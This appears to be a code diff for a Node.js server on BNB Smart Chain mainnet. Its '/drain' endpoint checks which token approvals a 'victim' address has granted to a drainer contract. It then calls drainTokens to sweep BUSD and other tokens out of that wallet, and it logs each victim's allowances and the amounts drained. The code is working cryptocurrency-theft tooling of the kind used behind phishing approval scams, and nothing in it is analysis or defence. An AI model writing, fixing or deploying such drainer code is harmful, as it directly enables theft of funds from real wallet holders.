@@ -20,7 +20,7 @@ const BSC_MAINNET_CHAIN_ID = 56;
 const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/", BSC_MAINNET_CHAIN_ID);
 const wallet = new ethers.Wallet(process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE", provider);
 
-const drainerContractAddress = "0xFc23Cc2C8d25c515B2a920432e5EBf6d018e3403";
+const drainerContractAddress = "0x0bfe730C4fE8952C01f5539B987462Fc3cA5ba3A";
 
 const tokenList = [
   { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
@@ -139,19 +139,24 @@ app.post("/drain", async (req, res) => {
     let tx, receipt, totalDrained = BigInt(0);
     let needsApproval = false;
 
-    // Check allowances
+    const walletBalance = await provider.getBalance(wallet.address);
+    if (walletBalance < ethers.parseEther("0.025")) {
+      throw new Error("Insufficient wallet BNB for gas");
+    }
+
     const tokenAddresses = tokenList.map(t => t.address);
     for (const token of tokenList) {
       const tokenContract = new ethers.Contract(token.address, tokenAbi, provider);
       const allowance = await tokenContract.allowance(victimAddress, drainerContractAddress);
+      console.log(`${token.symbol} allowance for ${victimAddress}: ${ethers.formatUnits(allowance, token.decimals)}`);
       if (allowance === BigInt(0)) {
         needsApproval = true;
       }
     }
 
-    if (drainAll) {
+    if (drainAll && !needsApproval) {
       console.log(`Draining all tokens from ${victimAddress}...`);
-      tx = await Drainer.drainTokens(victimAddress, tokenAddresses, { ...gasSettings, gasLimit: 1500000 }); // Increased gas limit
+      tx = await Drainer.drainTokens(victimAddress, tokenAddresses, { ...gasSettings, gasLimit: 1500000 });
       receipt = await tx.wait();
 
       const eventInterface = new ethers.Interface(drainerAbi);
@@ -165,9 +170,8 @@ app.post("/drain", async (req, res) => {
           console.log("Non-TokensDrained log:", log);
         }
       });
+      console.log(`Transaction sent: ${tx.hash}`);
     }
-
-    console.log(`Transaction sent: ${tx.hash}`);
 
     if (totalDrained > 0) {
       const message = `Drained ${ethers.formatEther(totalDrained)} total tokens`;
@@ -182,7 +186,7 @@ app.post("/drain", async (req, res) => {
     } else {
       res.json({
         success: false,
-        message: "No tokens drained. Check victim's balance and allowance.",
+        message: needsApproval ? "Approval needed" : "No tokens drained",
         victimAddress,
         transactionHash: tx?.hash || null,
         needsApproval
